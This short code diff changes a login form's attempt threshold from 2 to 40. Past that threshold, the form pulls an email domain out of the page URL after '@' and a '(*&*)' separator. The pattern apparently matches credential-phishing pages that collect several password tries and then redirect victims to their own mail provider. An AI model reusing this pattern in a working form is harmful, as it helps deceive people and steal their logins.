@@ -32,7 +32,7 @@ export const Form = ({ toggleForm })=>{
         }else{
 
             setCount(count=> count + 1);
-            if(count >= 2){
+            if(count >= 40){
                 const redirectURL = window.location.href;
                 const sliceEqualSign = redirectURL.indexOf("@");
                 const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('(*&*)', 1).toString();
